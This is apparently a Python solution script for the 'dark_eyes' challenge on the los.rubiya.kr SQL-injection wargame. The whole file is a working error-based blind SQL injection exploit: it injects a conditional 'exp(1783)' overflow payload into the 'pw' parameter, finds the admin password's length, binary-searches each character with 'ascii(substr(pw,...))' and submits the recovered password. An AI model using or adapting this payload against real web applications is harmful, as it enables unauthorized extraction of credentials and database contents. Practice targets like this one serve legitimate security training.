import requests
import os

URL_ID=os.environ['URL_ID']
PHPSESSID=os.environ['PHPSESSID']

url = f"https://los.rubiya.kr/chall/dark_eyes_{URL_ID}.php"
cookie = {'PHPSESSID': PHPSESSID}


pw_length = 0

for  i in range(1, 100):

    res = requests.get(url, params={'pw': f'\' or id =\'admin\' and (select exp(1783) where {i} < length(pw)) and \'1\'=\'1'},cookies=cookie)

    if len(res.text) < 1:
        pw_length = i + 1
    else:
        break

print(f"pw length: {pw_length}")

ans = ""

for i in range(0, pw_length):
    min_code = 0
    max_code = 256
    while min_code + 1 != max_code:
        target = (min_code + max_code) // 2
        res = requests.get(url, params={'pw': f'\' or id =\'admin\' and (select exp(1783) where {target} <= ascii(substr(pw,{i+1},1))) and \'1\'=\'1'},cookies=cookie)

        if len(res.text) < 1:
            min_code = target
        else:
            max_code = target

    ans += str(chr(min_code))
    print(f"(in progress)ans: {ans}")

res = requests.get(url, params={'pw': ans},cookies=cookie)

if res.text.find("Clear") > 0:
    print("Clear!")
else:
    print("Failed")
